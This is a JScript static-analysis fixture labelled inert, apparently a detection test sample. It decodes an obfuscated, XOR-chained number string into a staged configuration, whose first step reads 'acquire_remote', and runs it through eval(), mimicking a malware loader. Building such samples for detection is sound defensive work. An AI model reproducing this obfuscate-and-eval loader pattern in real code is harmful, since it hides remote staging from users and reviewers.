// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_08a42221 = function decode_08a42221_body(storedMaterial) {
  var recoveredMaterial = [];
  var previous = 142;
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ previous); previous = storedMaterial[i]; }
  return recoveredMaterial;
};
var recover_3cd0f5d8 = function recover_3cd0f5d8_body() {
  var packedText = "245-215-164-208-181-197-182-148-174-245-215-182-213-164-209-184-202-175-240-130-231-138-229-145-244-214-250-216-175-221-180-192-165-250-156-245-153-252-222-242-208-180-221-174-222-191-203-168-192-159-239-157-242-145-244-135-244-214-250-216-176-209-191-219-180-210-180-235-152-251-137-224-144-228-198-155-183-149-244-144-241-129-245-144-226-192-250-216-149-198-158-211-159-173-131-219-150-218-146-198-146-194-236-218-244-196-230-202-232-158-255-147-230-131-240-210-232-147-177-210-179-222-174-207-166-193-175-240-153-253-223-229-199-164-197-168-216-185-208-183-217-244-145-240-148-160-150-242-198-160-198-245-215-251-217-172-222-178-144-170-136-224-148-224-144-227-217-246-217-188-221-185-141-187-223-235-141-235-216-246-147-235-138-231-151-251-158-176-217-183-193-160-204-165-193-238-220-237-212-225-216-239-214-229-203-175-206-186-152-180-150-227-144-245-135-216-185-222-187-213-161-131-185-155-211-166-200-188-206-171-216-171-231-134-228-203-174-207-171-159-169-205-249-159-249-202-232-196-230-128-233-133-224-191-207-174-218-178-144-170-136-203-241-173-241-164-215-178-192-179-239-179-227-150-244-152-241-146-206-146-218-175-193-181-199-162-209-162-238-143-237-177-237-158-234-139-236-137-164-193-160-196-240-198-162-150-240-150-165-139-239-142-250-216-244-214-164-193-166-207-188-200-186-195-156-236-141-249-145-179-137-171-227-168-235-190-226-190-237-130-228-144-231-134-244-145-205-145-217-172-194-182-196-161-210-161-237-140-238-178-238-170-195-176-192-175-220-189-223-179-214-138-214-179-210-182-130-180-208-228-130-228-215-245-217-251-149-240-136-252-163-208-164-197-162-199-229-223-253-143-234-153-246-131-241-146-247-218-169-200-165-213-185-220-242-130-241-192-226-159-179-145-226-150-247-144-245-182-217-172-194-182-148-174-154-231";

  var packedParts = packedText.split("-");

  var storedMaterial = [];

  for (var di = 0; di < packedParts.length; di++) { storedMaterial.push(parseInt(packedParts[di], 10)); }

  var harmlessValue = (2 > 1) ? "left" : "right";

  var recoveredMaterial = [];

  try { recoveredMaterial = decode_08a42221.apply(null, [storedMaterial]); } catch (ignored) { recoveredMaterial = []; }

  var textParts = [], bi = 0;

  for (bi = 0; bi < recoveredMaterial.length; bi++) { textParts.push(String.fromCharCode(recoveredMaterial[bi])); }

  var configurationText = textParts.join("");

  return configurationText;
};
var inspect_bc184099 = function inspect_bc184099_body() {
  var configuration = eval("(" + recover_3cd0f5d8.apply(null, []) + ")");
  var table = { steps: function() { return configuration.steps; }, values: function() { return configuration.values; } };
  return { steps: table.steps.apply(null, []), adapter: configuration["adapter"], values: table["values"].apply(null, []), stageCount: configuration["stageCount"] };
};
